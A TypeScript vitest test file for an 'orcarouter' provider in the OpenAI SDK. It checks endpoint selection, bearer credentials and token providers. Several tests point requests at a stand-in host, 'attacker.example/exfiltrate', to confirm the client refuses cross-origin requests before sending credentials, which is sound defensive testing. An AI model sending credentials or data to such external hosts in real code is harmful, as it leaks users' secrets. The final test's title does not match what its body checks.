import { vi } from 'vitest';
import OpenAI from 'openai';
import type { RequestInfo, RequestInit } from 'openai/internal/builtin-types';
import { configureProvider } from 'openai/internal/provider';
import { orcarouter } from 'openai/providers/orcarouter';

const originalEnv = process.env;

beforeEach(() => {
  process.env = { ...originalEnv };
  delete process.env['ORCAROUTER_API_KEY'];
  delete process.env['ORCAROUTER_BASE_URL'];
});

afterEach(() => {
  process.env = originalEnv;
});

function jsonResponse(body: unknown = {}): Response {
  return Response.json(body, {
    headers: { 'Content-Type': 'application/json' },
  });
}

const ORCAROUTER_BASE_URL = 'https://api.orcarouter.ai/v1';

describe('orcarouter provider', () => {
  test('owns the default gateway endpoint and bearer authentication', async () => {
    let requestedURL: RequestInfo | undefined;
    let requestedInit: RequestInit | undefined;
    const client = new OpenAI({
      provider: orcarouter({ apiKey: 'orca-token' }),
      fetch: async (url, init) => {
        requestedURL = url;
        requestedInit = init;
        return jsonResponse();
      },
    });

    await client.request({ method: 'get', path: '/models' });

    expect(client.baseURL).toBe(ORCAROUTER_BASE_URL);
    expect(String(requestedURL)).toBe(`${ORCAROUTER_BASE_URL}/models`);
    expect(new Headers(requestedInit?.headers).get('authorization')).toBe('Bearer orca-token');
  });

  test('prefers an explicit baseURL over the environment and default endpoint', async () => {
    process.env['ORCAROUTER_BASE_URL'] = 'https://environment.example/v1';
    const client = new OpenAI({
      provider: orcarouter({ baseURL: 'https://explicit.example/v1', apiKey: 'orca-token' }),
    });

    expect(client.baseURL).toBe('https://explicit.example/v1');
  });

  test('falls back to ORCAROUTER_BASE_URL when no explicit baseURL is set', async () => {
    process.env['ORCAROUTER_BASE_URL'] = 'https://environment.example/v1';
    const client = new OpenAI({ provider: orcarouter({ apiKey: 'orca-token' }) });

    expect(client.baseURL).toBe('https://environment.example/v1');
  });

  test('baseURL: null skips the environment endpoint fallback', () => {
    process.env['ORCAROUTER_BASE_URL'] = 'https://environment.example/v1';

    const client = new OpenAI({
      provider: orcarouter({ baseURL: null, apiKey: 'orca-token' }),
    });

    expect(client.baseURL).toBe(ORCAROUTER_BASE_URL);
  });

  test('normalizes a Responses URL back to its API root', () => {
    const client = new OpenAI({
      provider: orcarouter({
        baseURL: 'https://gateway.example/responses/response-id',
        apiKey: 'orca-token',
      }),
    });

    expect(client.baseURL).toBe('https://gateway.example');
  });

  test('reads the gateway credential from ORCAROUTER_API_KEY', async () => {
    process.env['ORCAROUTER_API_KEY'] = 'environment-orca-key';
    let requestedInit: RequestInit | undefined;
    const client = new OpenAI({
      provider: orcarouter(),
      fetch: async (_url, init) => {
        requestedInit = init;
        return jsonResponse();
      },
    });

    await client.request({ method: 'get', path: '/models' });

    expect(new Headers(requestedInit?.headers).get('authorization')).toBe('Bearer environment-orca-key');
  });

  test('apiKey: null skips the environment credential fallback', () => {
    process.env['ORCAROUTER_API_KEY'] = 'environment-orca-key';

    expect(() => orcarouter({ apiKey: null })).toThrow('ORCAROUTER_API_KEY');
  });

  test('rejects cross-origin requests before sending credentials', async () => {
    const fetch = vi.fn(async () => jsonResponse());
    const client = new OpenAI({
      provider: orcarouter({ apiKey: 'orca-token' }),
      fetch,
      maxRetries: 0,
    });

    await expect(
      client.request({ method: 'get', path: 'https://attacker.example/exfiltrate' }),
    ).rejects.toThrow('OrcaRouter request origin');

    expect(fetch).not.toHaveBeenCalled();
  });

  test('rejects a custom Authorization header before fetch', async () => {
    const fetch = vi.fn(async () => jsonResponse());
    const client = new OpenAI({
      provider: orcarouter({ apiKey: 'orca-token' }),
      fetch,
    });

    await expect(
      client.request({
        method: 'get',
        path: '/models',
        headers: { authorization: 'Bearer custom-token' },
      }),
    ).rejects.toThrow('cannot be combined with a custom `Authorization` header');
    expect(fetch).not.toHaveBeenCalled();
  });

  test('rejects an empty explicit API key instead of falling back to the environment', () => {
    process.env['ORCAROUTER_API_KEY'] = 'environment-orca-key';

    expect(() => orcarouter({ apiKey: ' ' })).toThrow('must not be empty');
  });

  test('rejects ambiguous apiKey and tokenProvider options', () => {
    expect(() => orcarouter({ apiKey: 'orca-token', tokenProvider: async () => 'other-token' })).toThrow(
      'mutually exclusive',
    );
  });

  test('surfaces token provider failures with their cause', async () => {
    const cause = new Error('gateway unavailable');
    const fetch = vi.fn(async () => jsonResponse());
    const client = new OpenAI({
      provider: orcarouter({
        tokenProvider: async () => {
          throw cause;
        },
      }),
      fetch,
    });

    await expect(client.request({ method: 'get', path: '/models' })).rejects.toMatchObject({
      message: 'Failed to resolve an OrcaRouter API key.',
      cause,
    });
    expect(fetch).not.toHaveBeenCalled();
  });

  test('rejects an invalid value returned by a token provider', async () => {
    const fetch = vi.fn(async () => jsonResponse());
    const client = new OpenAI({
      provider: orcarouter({ tokenProvider: async () => '' }),
      fetch,
    });

    await expect(client.request({ method: 'get', path: '/models' })).rejects.toThrow(
      'must return a non-empty string',
    );
    expect(fetch).not.toHaveBeenCalled();
  });

  test('rejects an empty base URL', () => {
    expect(() => orcarouter({ baseURL: ' ', apiKey: 'orca-token' })).toThrow('must not be empty');
  });

  test('keeps the configured provider origin after mutating the client baseURL', async () => {
    const fetch = vi.fn(async () => jsonResponse());
    const client = new OpenAI({
      provider: orcarouter({ apiKey: 'orca-token' }),
      fetch,
      maxRetries: 0,
    });

    client.baseURL = 'https://attacker.example/v1';

    await expect(client.request({ method: 'get', path: '/exfiltrate' })).rejects.toThrow(
      'OrcaRouter request origin',
    );
    expect(fetch).not.toHaveBeenCalled();
  });

  test('allows same-origin absolute paths', async () => {
    let requestedURL: RequestInfo | undefined;
    let requestedInit: RequestInit | undefined;
    const client = new OpenAI({
      provider: orcarouter({ apiKey: 'orca-token' }),
      fetch: async (url, init) => {
        requestedURL = url;
        requestedInit = init;
        return jsonResponse();
      },
    });

    await client.request({ method: 'get', path: `${ORCAROUTER_BASE_URL}/models` });

    expect(String(requestedURL)).toBe(`${ORCAROUTER_BASE_URL}/models`);
    expect(new Headers(requestedInit?.headers).get('authorization')).toBe('Bearer orca-token');
  });

  test('checks the final request origin again before a retry', async () => {
    const options = { method: 'get' as const, path: '/models', maxRetries: 1 };
    const fetch = vi.fn(async () => {
      options.path = 'https://attacker.example/exfiltrate';
      return Response.json(
        { error: { message: 'retry the request' } },
        { status: 500, headers: { 'retry-after-ms': '1' } },
      );
    });
    const client = new OpenAI({ provider: orcarouter({ apiKey: 'orca-token' }), fetch });

    await expect(client.request(options)).rejects.toThrow('OrcaRouter request origin');

    expect(fetch).toHaveBeenCalledTimes(1);
  });

  test('refreshes the environment credential across withOptions', async () => {
    process.env['ORCAROUTER_API_KEY'] = 'first-token';
    const authorizationHeaders: string[] = [];
    const fetch = async (_url: RequestInfo, init?: RequestInit): Promise<Response> => {
      authorizationHeaders.push(new Headers(init?.headers).get('authorization') ?? '');
      return jsonResponse();
    };
    const client = new OpenAI({ provider: orcarouter(), fetch });

    await client.request({ method: 'get', path: '/models' });
    delete process.env['ORCAROUTER_API_KEY'];
    const copiedClient = client.withOptions({ timeout: 1000 });
    process.env['ORCAROUTER_API_KEY'] = 'refreshed-token';
    await copiedClient.request({ method: 'get', path: '/models' });

    expect(authorizationHeaders).toEqual(['Bearer first-token', 'Bearer refreshed-token']);
  });

  test('rejects a runtime without a configured credential', async () => {
    const runtime = configureProvider(orcarouter({ apiKey: 'orca-token' }));

    expect(runtime.name).toBe('orcarouter');
    expect(runtime.baseURL).toBe(ORCAROUTER_BASE_URL);
  });
});
